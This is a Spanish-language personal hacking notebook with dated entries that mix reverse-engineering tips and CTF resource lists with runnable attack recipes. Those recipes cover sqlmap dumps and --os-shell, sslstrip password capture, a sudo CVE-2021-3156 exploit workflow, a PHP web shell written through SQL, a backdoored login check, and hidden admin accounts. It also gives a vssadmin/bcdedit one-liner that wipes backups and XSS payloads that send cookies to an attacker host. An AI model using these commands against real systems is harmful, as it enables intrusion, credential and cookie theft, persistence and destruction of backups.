Permite seleccionar todas las filas de una tabla de determinada columna sin usar LIMIT.



# rabin2

jueves, 9 de julio de 2020

14:15

rabin2 -I crackme : muestra información del ejecutable

-S : muestra las secciones



# SQLiv - Cómo encontrar sitios vulnerables a SQLi

jueves, 7 de mayo de 2020

14:53

También para buscar sitios vulnerables de manera automática, utilizando los google DORK existe el proyecto sqliv

para descargarlo, abrimos una consola en Linux y escribimos:

git clone [https://github.com/Hadesy2k/sqliv.git](https://github.com/Hadesy2k/sqliv.git)



pip install -r requirements.txt



sudo python2 setup.py -i

Luego para ocuparse :

Multiple domain scanning with SQLi dork

python sqliv.py -d \&lt;SQLI DORK\&gt; -e \&lt;SEARCH ENGINE\&gt;



python sqliv.py -d &quot;inurl:index.php?id=&quot; -e google



# SQLMAP - Cómo explotar SQLi automáticamente

jueves, 7 de mayo de 2020

14:53

[https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet](https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet)

[https://www.netsparker.com/blog/web-security/sql-cheat-sheet/](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)



Ya sabiendo nuestro objetivo, comenzamos con sqlmap a sacar:

1.- Bases

2.- Tablas de la base.

3.- Columnas de Tablas

4.- Dump de las columna.

Saber Bases de datos

sqlmap -u [http://www.TARGET.com/TARGET.php?id=1](http://www.TARGET.com/TARGET.php?id=1) --dbs

sqlmap -u [http://www.TARGET.com/TARGET.php](http://www.TARGET.com/TARGET.php) --data &quot;username=xyz&amp;password=xyz&amp;submit=xyz&quot; --dbs



O

Saber Base de datos principal

sqlmap -u [http://www.TARGET.com/TARGET.php?id=1](http://www.TARGET.com/TARGET.php?id=1) --current-db

Saber las tablas de la base de un sitio

sqlmap -u [http://www.TARGET.com/TARGET.php?id=1](http://www.TARGET.com/TARGET.php?id=1) -D nombrebase --tables

Saber las columnas de una tabla específica de la base de datos

sqlmap -u [http://www.TARGET.com/TARGET.php?id=1](http://www.TARGET.com/TARGET.php?id=1) -D nombrebase -T nomreTabla --columns

Dump de la información contenida en las columnas seleccionadas

sqlmap -u [http://www.TARGET.com/TARGET.php?id=1](http://www.TARGET.com/TARGET.php?id=1) -D nombrebase -T nomreTabla -C columna1,columna2,columna3 --dump

Para cuando se pone más complicado inyectar y no tenemos ID=

sqlmap.py -u &quot;[http://vulnerable/](http://vulnerable/)&quot; --headers=&quot;X-Forwarded-For: \*&quot; --dbs

sqlmap.py -u &quot;[http://vulnerable/](http://vulnerable/)Login.php&quot; --forms --risk=3 --level=5 --dbs

Otra forma de probar es

sqlmap –g &quot;site:[fbi.gov](http://fbi.gov/) inurl: ?id=&quot;

para llamar una shell directamente desde sqlmap

sqlmap -u[http://(victima/algo.php?id=1](about:blank) --random-agent --level 5 --risk 3 --batch --threads=10 --os-shell -vvv

Para injectar un Post request

Slqmap -r \&lt;archivo con headers del post + parametros\&gt; -p \&lt;valor que se quiere inyectar(no es obligatrorio)\&gt;



# SSLSTRIP - Cómo capturar contraseñas en webpages

jueves, 7 de mayo de 2020

14:54

root@kali:~# echo 1 \&gt; /proc/sys/net/ipv4/ip\_forward



root@kali:~# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080



root@kali:~# sslstrip 8080



# STEGHIDE - Cómo steganografiar

jueves, 7 de mayo de 2020

14:54

steghide embed -ef sample.txt -cf image.jpg -sf output.jpg

This passively stores the sample.txt data into the output.jpg file with the image.jpg as cover.

ef = embed file

cf = cover file

sf = stegofile



# stego en LinkedIn - Cómo ingresar

jueves, 7 de mayo de 2020

14:55

este formato es &quot;.PNG&quot;. Si antes de subir una foto a Linkedin, la transformamos en .PNG, tendremos muchas probabilidades de que no nos la modifique, a la hora de almacenarla en sus servidores. Además de usar este formato, es muy conveniente respetar algunos valores que debe tener la foto antes de subirla, como no superar los 2.048 píxeles de resolución y que pese menos de 4 Mb. (fuente: [PeritoInformático](https://www.informaticoforense.eu/esteganografia-en-linkedin/))



# SUDO EXPLOIT

# CVE-2021-3156

viernes, 26 de febrero de 2021

16:45

[https://github.com/blasty/CVE-2021-3156](https://github.com/blasty/CVE-2021-3156)

Descargar

Transferir a la victima

Ejecutar sudo -V para identificar la versión de sudo

Ejecutar make

Make sandwish \&lt;numero de version correcta\&gt;

Profit.

Targets disponibles.

0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27

1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31

2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28



[https://github.com/stong/CVE-2021-3156](https://github.com/stong/CVE-2021-3156)

Para sudo 1.8.21p2

Pero necesitamos saber la password del usuario que está ejecutándolo





# TRAPE - Cómo tomar control de un equipo remoto

jueves, 7 de mayo de 2020

14:55

Sirve para crear un link falso que recupera sesiones activas del usuario que lo carga

git clone [https://github.com/boxug/trape.git](https://github.com/boxug/trape.git)

cd trape

pip install -r requirements.txt

python trape.py --url [http://www.google.com/](http://www.google.com/) --port 80



# Tratamiento de tty

miércoles, 17 de febrero de 2021

22:50

[https://s4vitar.github.io/oscp-preparacion/#tratamiento-de-la-tty](https://s4vitar.github.io/oscp-preparacion/#tratamiento-de-la-tty)



script /dev/null -c bash





# TOR + Proxychains - Como anonimizar el tráfico

jueves, 7 de mayo de 2020

14:55

Para activar TOR + Proxychains

Sudo apt-get install tor

Sudo service tor start

Sudo leafpad /etc/proxychains.conf

Descomentar borrando el # la línea dynamic\_chain

Comentar con un # la lìnea strict\_chain,

añadir al final del archivo: socks5 127.0.0.1 9050

Usar los programas con proxychains. ejemplo

proxychains sqlmap -u \&lt;website\&gt;



# Tor Hidden\_service

sábado, 11 de julio de 2020

23:13

python3 -m http.server --bind 127.0.0.1 8080

nano /etc/tor/torrc

##### This section is just for location-hidden services #####

HiddenServiceDir /var/lib/tor/hidden\_service/

HiddenServicePort 80 127.0.0.1:8080

sudo tor

sudo cat /var/lib/tor/hidden\_service/hostname ---\&gt;para saber la url en hidden\_web





# Response

domingo, 2 de agosto de 2020

16:46

[https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/](https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/)



# Webhacking techs

lunes, 3 de agosto de 2020

11:07

# Cómo bypass el x-limit-rate

1. X-Forwarded-For : IP
2. X-Forwarded-Host : IP
3. X-Client-IP : IP
4. X-Remote-IP : IP
5. X-Remote-Addr : IP
6. X-Host : IP
7. [https://medium.com/bugbountywriteup/bypassing-rate-limit-like-a-pro-5f3e40250d3c](https://medium.com/bugbountywriteup/bypassing-rate-limit-like-a-pro-5f3e40250d3c)

#

# Cómo encontrar vulnerabilidades en php con grep

[https://www.hackplayers.com/2019/11/buscando-vulnerabilidades-en-php-con-grep.html](https://www.hackplayers.com/2019/11/buscando-vulnerabilidades-en-php-con-grep.html)



# Como hacer bypass de acceso usando el método OPTIONS

GET /instructor/performance/students/?course\_id=497558 HTTP/1.1 : 403 Forbidden

OPTIONS /instructor/performance/students/?course\_id=497558 HTTP/1.1 : 200 OK



# Cómo llamar a una shell desde un phpMyAdmin vulnerado

Una vez se disponen de los credenciales de root del Mysql, es fácil conseguir una shell del sistema operativo. El procedimiento se hace mediante una SQL que escribe en un archivo.

1.- Entrar en la base de datos de la víctima con Mysql Client o PhpMyAdmin.

2.- Ejecutar la siguiente SQL. Esto creará un archivo que permitirá la ejecución de comandos. Nótase que debemos ubicar el archivo en una path que sea accesible desde internet, esté variará dependiendo del S.O. y configuración.

SELECT &quot;\&lt;?php system($\_GET[&#39;cmd&#39;]); ?\&gt;&quot; INTO OUTFILE &quot;/var/www/info.php&quot;

3.- Abrir con el navegador el archivo y ejecutar comandos apropiados. Aquí ya la imaginación de cada persona para explotar el S.O. En mi opinión la opción fácil es subir la c99shell.php con CURL.

[https://www.eninsoft.com/info.php?cmd=ls](https://www.eninsoft.com/info.php?cmd=ls) -la

4.- Borrar las huellas de acceso

# Cómo generar Persistencia editando una webpage

Busca la página de logueo y en la condición IF agregarle un OR ejemplo:

If ($pass==$row[&quot;password&quot;] or $password == &#39;perro&#39; ];

# Cómo generar LFI local file Inclusion

[http://10.10.112.168/lfi/lfi.php?page=/var/log/apache2/access.log](http://10.10.112.168/lfi/lfi.php?page=/var/log/apache2/access.log)

luego de identificar que es posible hacer LFI, se puede pasar a la opción de:

Log poisoning

/var/log/apache2/access.log

# Cómo hacer fuzzeo de parametros

paramspider

[https://noticiasseguridad.com/tutoriales/como-encontrar-todos-los-parametros-obfuscados-en-una-url-durante-la-pentesting/](https://noticiasseguridad.com/tutoriales/como-encontrar-todos-los-parametros-obfuscados-en-una-url-durante-la-pentesting/)







# Windows -Comandos útiles

jueves, 7 de mayo de 2020

14:56

para deshabilitar el SMB1 en windows es necesario ejecutar powersploit como administrador

Set-SmbServerConfiguration -EnableSmb1Protocol $false

Para agregar un usuario a administrador

net user htb abc123! /add ; net localgroup administrators htb /add

para obtener un archivo sin permiso de administrador

runas /user:\&lt;hosname\&gt;\Administrator /savecred &quot;cmd /k type c:\text.txt \&gt; c:\users\yo\desktop\text2.txt&quot;

Para ver el histórico de comandos de DOS.

doskey /history

Para agregar persistencia en un equipo comprometido

net user clarksoft clarksoftpass /add

net localgroup Administrators clarksoft /add

Para agregar permisos de ejecución remota

cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG\_DWORD /d 1 /f

Para respaldar SAM y SYSTEM

reg save HKLM\SAM sam.backup

reg save HKLM\SYSTEM system.backup

Para hacer una carpeta en windows sin nombre

ALT+0160



[https://www.hackplayers.com/2020/05/crackear-usuario-windows-sin-privilegios.html](https://www.hackplayers.com/2020/05/crackear-usuario-windows-sin-privilegios.html)





# Windows Attack - Cómo eliminar copias de seguridad

jueves, 7 de mayo de 2020

14:57

Para eliminar las copias de seguridad y deshabilitar la opcion de crear nuevas

(debe ser con permisos de administrador)

cmd.exe /C vssadmin.exe delete shadows /all /quiet &amp; wmic.exe shadowcopy delete &amp; bcdedit /set {default} bootstatuspolicy ignoreallfailures &amp; bcdedit /set {default} recoveryenabled no &amp; wbadmin delete catalog -quiet





# Windows Shell

jueves, 7 de mayo de 2020

14:57

Como obtener una consola cuando el GPO lo restringe

un fichero .bat (cuidado con los espacios):

@echo off

:loop

set /p \_cmd= &quot;%CD%\&gt;&quot;

%\_cmd%

goto :loop



# Wireshark

jueves, 7 de mayo de 2020

14:57

Archivos desde pcap

Open wireshark, load the pcap and select File -\&gt; Export Object -\&gt; HTTP. Now &quot;Save All&quot; to a new directory. This will save all files transfered via HTTP

Texto desde pcap (asegurarse de haber ingresado la password para decryptar el tráfico)

Open wireshark, load the pcap and select File -\&gt; Export Packet Dissection-\&gt; Plain Text.

Seleccionar el nombre del destino y agregar Packet Bytes. Now &quot;Save&quot;



Para importar una llave de encriptación (encrypted keys)

Edit, preferences, protocol, TLS [+]

IP address: 127.0.0.1

Port: start\_tls

Protocol: http

Keyfile: ubicación de la llave RSA

OK y el contenido del CAP estará desencriptado.









**ZeroLogon con Wireshark**

**DCERPC**

![](RackMultipart20210412-4-pcx9xb_html_94ad5042d91d7c0b.png)

![](RackMultipart20210412-4-pcx9xb_html_542ad6fa9b1ae042.png)



# XSS - Cómo ingresar código en las webs vulnerables

jueves, 7 de mayo de 2020

14:57



[http://www.xss-payloads.com/](http://www.xss-payloads.com/)



En mensajes/comentarios grabar un script. También se puede poner en la URL

Ej:

\&lt;script\&gt;alert(1);\&lt;/script\&gt;

\&lt;script\&gt;window.location=&quot;[http://test.net](http://test.net/)&quot;;\&lt;/script\&gt;

\&lt;sCriPt\&gt;alert(1)\&lt;/sCriPt\&gt;

\&lt;sCriPt\&gt;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))\&lt;/sCriPt\&gt;

\&lt;div onmouseover=&#39;alert(1)&#39; /\&gt;

\&lt;img src=&quot;nada&quot; onerror=&#39;alert(1)&#39; /\&gt;

\&lt;a href=&#39;javascript:alert(1)&#39;\&gt;hola\&lt;/a\&gt;

\&lt;svg/onload=prompt(&#39;Hello&#39;);\&gt;

un alert en la web: [https://pastebin.com/raw/15S5qZs0](https://pastebin.com/raw/15S5qZs0)

[http://www.TrustedSearchEngine.com/search?\&lt;script\&gt;location.href=&#39;http://www.SecretVillainSite.com/hijacker.php?cookie=&#39;+document.cookie;\&lt;/script\&gt;](http://www.trustedsearchengine.com/search?%3Cscript%3Elocation.href=%27http://www.SecretVillainSite.com/hijacker.php?cookie=%27+document.cookie;%3C/script%3E)

como secuestrar una cookie desde un mensaje

crear el archivo cookie.php

\&lt;?php

$cookie = $\_GET[&quot;c&quot;];

?\&gt;

levantar el servicio de php donde esté el archivo cookie.php

php -S 10.8.20.139:8000

agregar en el mensaje el siguiente xxs

\&lt;script\&gt;document.location=&#39;[http://10.8.20.139:8000/cookie.php?c=&#39;+document.cookie;\&lt;/script\&gt;](http://10.8.20.139:8000/cookie.php?c=%27+document.cookie;%3C/script%3E)

una vez que los otros usuarios lean el mensaje. la cookie se desplegará en el log del php.



XSS port scanning

\&lt;script\&gt;

 for (let i = 0; i \&lt; 256; i++) {

  let ip = &#39;192.168.0.&#39; + i

  let code = &#39;\&lt;img src=&quot;http://&#39; + ip + &#39;/favicon.ico&quot; onload=&quot;this.onerror=null; this.src=/log/&#39; + ip + &#39;&quot;\&gt;&#39;

  document.body.innerHTML += code

 }

\&lt;/script\&gt;



\&lt;script\&gt;alert(window.location.hostname)\&lt;/script\&gt; ---\&gt;muestra la IP

\&lt;script\&gt;document.querySelector(&#39;#thm-title&#39;).textContent = &#39;I am a hacker&#39;\&lt;/script\&gt;





# Ransomware recovery

domingo, 1 de noviembre de 2020

16:36

FREE/Paid RANSOMWARE DECRYPTORS :

[http://media.kaspersky.com/utilities/VirusUtilities/EN/rakhnidecryptor.zip](http://media.kaspersky.com/utilities/VirusUtilities/EN/rakhnidecryptor.zip)

[https://decrypter.emsisoft.com/download/amnesia](https://decrypter.emsisoft.com/download/amnesia)

[https://decrypter.emsisoft.com/download/amnesia2](https://decrypter.emsisoft.com/download/amnesia2)

[https://decrypter.emsisoft.com/apocalypse](https://decrypter.emsisoft.com/apocalypse)

[https://decrypter.emsisoft.com/apocalypsevm](https://decrypter.emsisoft.com/apocalypsevm)

[https://decrypter.emsisoft.com/autolocky](https://decrypter.emsisoft.com/autolocky)

[https://decrypter.emsisoft.com/badblock](https://decrypter.emsisoft.com/badblock)

[http://www.avg.com/us-en/ransomware-decryption-tools#bart](http://www.avg.com/us-en/ransomware-decryption-tools#bart)

[https://files.avast.com/files/decryptor/avast\_decryptor\_btcware.exe](https://files.avast.com/files/decryptor/avast_decryptor_btcware.exe)

[http://media.kaspersky.com/utilities/VirusUtilities/EN/rakhnidecryptor.zip](http://media.kaspersky.com/utilities/VirusUtilities/EN/rakhnidecryptor.zip)

[https://decrypter.emsisoft.com/cryptinfinite](https://decrypter.emsisoft.com/cryptinfinite)

[https://decrypter.emsisoft.com/cryptodefense](https://decrypter.emsisoft.com/cryptodefense)

[https://github.com/aaaddress1/my-Little-Ransomware/tree/master/decryptoTool](https://github.com/aaaddress1/my-Little-Ransomware/tree/master/decryptoTool)

[https://decrypter.emsisoft.com/dmalocker](https://decrypter.emsisoft.com/dmalocker)

[https://decrypter.emsisoft.com/dmalocker2](https://decrypter.emsisoft.com/dmalocker2)

[https://decrypter.emsisoft.com/fabiansomware](https://decrypter.emsisoft.com/fabiansomware)

_Desde \&lt;_[_https://web.telegram.org/#/im?p=@bookspaceCL_](https://web.telegram.org/#/im?p=@bookspaceCL)_\&gt;_



# Radare2

jueves, 9 de julio de 2020

14:18

Pasos básicos para inspeccionar un binario

r2 -d \&lt;filename\&gt;

aaa

afl

pdf @main

db 0x\&lt;direccion que necesita revisar, normalmente antes que se ejecute una función\&gt;

dc --\&gt;para ejecutar el binario en modo binario o continuar luego de un db

dr --\&gt;para ver todos los registros

px @\&lt;rax,etc\&gt; --\&gt;para ver el contenido de un registro en particular

ood &#39;valor&#39; --\&gt;si necesito poner un parámetro al ejecutable





aaa para analizar

V hex view

VV @ sym.main

dr --\&gt;muestra todos los valores de los registros.

# **radare2**

load without any analysis (file header at offset 0x0): r2 -n /path/to/file

- analyze all: aa
- show sections: iS
- list functions: afl
- list imports: ii
- list entrypoints: ie
- seek to function: s sym.main

**project management**

- open project: Po \&lt;name\&gt;
- save project: Ps \&lt;name\&gt;
- edit project notes: Pn -

**inspecting a function**

- show basic block disassembly: pdb
- show function disassembly: pdf
- show function arguments: afa
- show function variables: afv
- rename function variable: afvn
- set function variable type: afvt
- add/analyze function: af

**comments:**

by default, these get displayed in disassembly listings to the right of a line. disable them in V visual mode using &#39; (single quote).

multiline comments are not rendered handled well. they don&#39;t look pretty.

- add comment (using editor): CC!
  - note: multiline comments are not formatted nicely
- append comment: CC \&lt;text\&gt;
- overwrite comment: CCu \&lt;text\&gt;
- show comment: CC.
- show comment in this function: CCf

**visual mode**

- enter visual mode: V
- select function, variable, xref: v
- quick command/seek: \_ \&lt;search string\&gt;
- custom quick command list: ??
  - you can update the list of commands shown here by changing $R2HOME/hud.
  - ref: [http://radare.today/posts/visual-mode/](http://radare.today/posts/visual-mode/)
- show cursor: c
- set function name: d
- add comment: ;
- remove comment: ;-

&quot;flag&quot; means give something a type. like function or symbol.

**graph mode**

graph mode is not visual mode!

- enter graph modes: VV
- cycle types of graphs:
  - forward: p
  - backwards: P
- types of graphs:
  - graph view
  - graph view + opcode bytes
  - esil
  - esil + comments
  - overview
- seek to function: g\&lt;identifier\&gt;
- undo seek: u
- show comments: &#39;
- add comment: /
- add comment (complex): :CC!
- select bb: ???
- seek to next bb: tab
- seek to previous bb: TAB
- if bb has conditional branch:
  - seek to True target: t
  - seek to False target: f

**configuration**

recommended contents of ~/.radare2rc:

# Show comments at right of disassembly if they fit in screen
 e asm.cmt.right=true

# Shows pseudocode in disassembly. Eg mov eax, str.ok = \&gt; eax = str.ok
 e asm.pseudo = true

# Solarized theme
 eco solarized

# Use UTF-8 to show cool arrows that do not look like crap :)
 e scr.utf8 = true

_Desde \&lt;_[_https://gist.github.com/williballenthin/6857590dab3e2a6559d7_](https://gist.github.com/williballenthin/6857590dab3e2a6559d7)_\&gt;_

Writeup de ccradare2

[http://an1mehacker.github.io/writeups/ccradare2/](http://an1mehacker.github.io/writeups/ccradare2/)



# 0day kali

domingo, 12 de julio de 2020

15:33

![](RackMultipart20210412-4-pcx9xb_html_7629ef8b44be21cb.png)

/proc values are stored in RAM so it isn&#39;t persistent. But it read its initial values from a file. You can permanently change the value of /proc/sys/kernel/yama/ptrace\_scope to 0 by editing the file /etc/sysctl.d/10-ptrace.conf and change the line:

kernel.yama.ptrace\_scope = 1

To

kernel.yama.ptrace\_scope = 0

_Desde \&lt;_[_https://unix.stackexchange.com/questions/329504/proc-sys-kernel-yama-ptrace-scope-keeps-resetting-to-1_](https://unix.stackexchange.com/questions/329504/proc-sys-kernel-yama-ptrace-scope-keeps-resetting-to-1)_\&gt;_





# Otros Documentos similares

lunes, 3 de agosto de 2020

11:26

[https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets](https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets)

[https://s4vitar.github.io/oscp-preparacion/](https://s4vitar.github.io/oscp-preparacion/)

[https://s4vitar.github.io/oswp-preparacion/](https://s4vitar.github.io/oswp-preparacion/)

[https://s4vitar.github.io/videos/?#](https://s4vitar.github.io/videos/?) --\&gt;buscador de material en videos de S4vitar

[https://github.com/Hack-with-Github/Awesome-Hacking](https://github.com/Hack-with-Github/Awesome-Hacking)

[https://www.amanhardikar.com/mindmaps/Practice.html](https://www.amanhardikar.com/mindmaps/Practice.html)



Sites for Begginers to learn Cyber Hacking and Security:lock::cyclone:

EnigmaGroup

[http://www.enigmagroup.org/](http://www.enigmagroup.org/)

Exploit Exercises

[http://exploit-exercises.com/](http://exploit-exercises.com/)

Google Gruyere

[http://google-gruyere.appspot.com/](http://google-gruyere.appspot.com/)

Gh0st Lab

[http://www.gh0st.net/](http://www.gh0st.net/)

Hack This Site

[http://www.hackthissite.org/](http://www.hackthissite.org/)

HackThis

[http://www.hackthis.co.uk/](http://www.hackthis.co.uk/)

HackQuest

[http://www.hackquest.com/](http://www.hackquest.com/)

[Hack.me](http://Hack.me/)

[https://hack.me](https://hack.me/)

Hacking-Lab

[https://www.hacking-lab.com](https://www.hacking-lab.com/)

Hacker Challenge

[http://www.dareyourmind.net/](http://www.dareyourmind.net/)

Hacker Test

[http://www.hackertest.net/](http://www.hackertest.net/)

hACME Game

[http://www.hacmegame.org/](http://www.hacmegame.org/)

Hax.Tor

[http://hax.tor.hu/](http://hax.tor.hu/)

OverTheWire

[http://www.overthewire.org/wargames/](http://www.overthewire.org/wargames/)

pwn0

[https://pwn0.com/home.php](https://pwn0.com/home.php)

RootContest

[http://rootcontest.com/](http://rootcontest.com/)

Root Me

[http://www.root-me.org/?lang=en](http://www.root-me.org/?lang=en)

Security Treasure Hunt

[http://www.securitytreasurehunt.com/](http://www.securitytreasurehunt.com/)

Smash The Stack

[http://www.smashthestack.org/](http://www.smashthestack.org/)

TheBlackSheep and Erik

[http://www.bright-shadows.net/](http://www.bright-shadows.net/)

ThisIsLegal

[http://thisislegal.com/](http://thisislegal.com/)

Try2Hack

[http://www.try2hack.nl/](http://www.try2hack.nl/)

WabLab

[http://www.wablab.com/hackme](http://www.wablab.com/hackme)

XSS: Can You XSS This?

[http://canyouxssthis.com/HTMLSanitizer/](http://canyouxssthis.com/HTMLSanitizer/)

XSS: ProgPHP

[http://xss.progphp.com/](http://xss.progphp.com/)

DigitalCorpora

[http://digitalcorpora.org/](http://digitalcorpora.org/)

Digital Forensics Tool Testing Images

[http://dftt.sourceforge.net/](http://dftt.sourceforge.net/)

DFRWS 2014 Forensics Rodeo

[http://www.cs.uno.edu/~golden/dfrws-2014-rodeo.html](http://www.cs.uno.edu/~golden/dfrws-2014-rodeo.html)

Linux LEO Supplemental Files

[http://linuxleo.com/](http://linuxleo.com/)

volatility memory samples

[https://code.google.com/p/volatility/wiki/FAQ](https://code.google.com/p/volatility/wiki/FAQ)

ISFCE Sample Practical Exercise

[http://www.isfce.com/sample-pe.htm](http://www.isfce.com/sample-pe.htm)

ForGe Forensic test image generator

[https://github.com/hannuvisti/forge](https://github.com/hannuvisti/forge)

_Desde \&lt;_[_https://web.telegram.org/#/im?p=@bookspaceCL_](https://web.telegram.org/#/im?p=@bookspaceCL)_\&gt;_

Network Forensics

Wireshark Sample Captures

[http://wiki.wireshark.org/SampleCaptures](http://wiki.wireshark.org/SampleCaptures)

Wireshark Network Analysis Book Supplements

[http://www.wiresharkbook.com/studyguide.html](http://www.wiresharkbook.com/studyguide.html)

pcapr

[http://www.pcapr.net](http://www.pcapr.net/)

PacketLife Capture Collection

[http://packetlife.net/captures/](http://packetlife.net/captures/)

DigitalCorpora Packet Dumps

[http://digitalcorpora.org/corpora/packet-dumps](http://digitalcorpora.org/corpora/packet-dumps)

Evil Fingers PCAP Challenges

[https://www.evilfingers.com/repository/pcaps\_challenge.php](https://www.evilfingers.com/repository/pcaps_challenge.php)

PCAPS Repository

[https://github.com/markofu/pcaps](https://github.com/markofu/pcaps)

Chris Sanders Packet Captures

[http://chrissanders.org/packet-captures/](http://chrissanders.org/packet-captures/)

Tcpreplay Sample Captures

[http://tcpreplay.appneta.com/wiki/captures.html](http://tcpreplay.appneta.com/wiki/captures.html)

Enron Email Dataset

[http://www.cs.cmu.edu/~enron/](http://www.cs.cmu.edu/~enron/)

MAWI Working Group Traffic Archive

[http://mawi.wide.ad.jp/mawi/](http://mawi.wide.ad.jp/mawi/)

LBNL-FTP-PKT

[http://ee.lbl.gov/anonymized-traces.html/](http://ee.lbl.gov/anonymized-traces.html/)

BookSPACE knowledge freedom

Malware Analysis

Open Malware / Offensive Computing

[http://openmalware.org/](http://openmalware.org/)

Contagio

[http://contagiodump.blogspot.com/](http://contagiodump.blogspot.com/)

VX Heaven

[http://vxheaven.org/](http://vxheaven.org/)

[VirusShare.com](http://VirusShare.com/) / VXShare

[http://virusshare.com/](http://virusshare.com/)

VXVault

[http://vxvault.siri-urz.net](http://vxvault.siri-urz.net/)

MalShare

[http://malshare.com/](http://malshare.com/)

Virusign

[http://www.virusign.com/](http://www.virusign.com/)

theZoo / Malware DB

[http://ytisf.github.io/theZoo/](http://ytisf.github.io/theZoo/)

malc0de

[http://malc0de.com/database/](http://malc0de.com/database/)

FakeAVs blog

[http://www.fakeavs.com/](http://www.fakeavs.com/)

malware\_traffic

[http://malware-traffic-analysis.net/](http://malware-traffic-analysis.net/)

Georgia Tech malrec page

[http://panda.gtisc.gatech.edu/malrec/](http://panda.gtisc.gatech.edu/malrec/)

Kernelmode Forum

[http://www.kernelmode.info](http://www.kernelmode.info/)

Malware Hub Forum

[http://malwaretips.com/categories/malware-hub.103/](http://malwaretips.com/categories/malware-hub.103/)

[MalwareBlacklist.com](http://MalwareBlacklist.com/)

[http://www.malwareblacklist.com](http://www.malwareblacklist.com/)

Joxean Koret&#39;s List

[http://malwareurls.joxeankoret.com](http://malwareurls.joxeankoret.com/)

Sucuri Research Labs

[http://labs.sucuri.net/?malware](http://labs.sucuri.net/?malware)

CLEAN MX realtime database

[http://support.clean-mx.de/clean-mx/viruses.php](http://support.clean-mx.de/clean-mx/viruses.php)

Contagio Mobile Malware

[http://contagiominidump.blogspot.com/](http://contagiominidump.blogspot.com/)

Android Sandbox

[http://androidsandbox.net/samples/](http://androidsandbox.net/samples/)

maltrieve

[http://maltrieve.org/](http://maltrieve.org/)

HoneyDrive

[http://bruteforce.gr/honeydrive](http://bruteforce.gr/honeydrive)

BookSPACE knowledge freedom

Online and CTFs

Honeynet Challenges

[https://www.honeynet.org/challenges](https://www.honeynet.org/challenges)

[http://old.honeynet.org/scans/index.html](http://old.honeynet.org/scans/index.html)

I Smell Packets

[http://ismellpackets.com/](http://ismellpackets.com/)

Network Forensics Puzzle contest

[http://forensicscontest.com/puzzles](http://forensicscontest.com/puzzles)

DEF CON CTF Archive

[https://www.defcon.org/html/links/dc-ctf.html](https://www.defcon.org/html/links/dc-ctf.html)

DFRWS

[http://www.dfrws.org/2013/challenge/index.shtml](http://www.dfrws.org/2013/challenge/index.shtml)

[http://www.dfrws.org/2010/challenge/](http://www.dfrws.org/2010/challenge/)

[http://www.dfrws.org/2011/challenge/index.shtml](http://www.dfrws.org/2011/challenge/index.shtml)

[http://www.dfrws.org/2007/challenge/index.shtml](http://www.dfrws.org/2007/challenge/index.shtml)

[http://www.dfrws.org/2006/challenge/](http://www.dfrws.org/2006/challenge/)

[http://www.dfrws.org/2005/challenge/](http://www.dfrws.org/2005/challenge/)

ForensicKB Practicals

[http://www.forensickb.com/2008/01/forensic-practical.html](http://www.forensickb.com/2008/01/forensic-practical.html)

[http://www.forensickb.com/2008/01/forensic-practical-2.html](http://www.forensickb.com/2008/01/forensic-practical-2.html)

[www.honeynet.org](http://www.honeynet.org/)

[Challenges – The Honeynet Project](https://www.honeynet.org/challenges/)

Honeypot research

_Desde \&lt;_[_https://web.telegram.org/#/im?p=@bookspaceCL_](https://web.telegram.org/#/im?p=@bookspaceCL)_\&gt;_





# Esp8266

jueves, 1 de octubre de 2020

15:49

[https://derechodelared.com/wi-fi-deauther/](https://derechodelared.com/wi-fi-deauther/)



# Lazyadmin

lunes, 15 de marzo de 2021

19:25

Autopwn [https://pastebin.com/raw/NNJtRTbn](https://pastebin.com/raw/NNJtRTbn)

By s4vitar
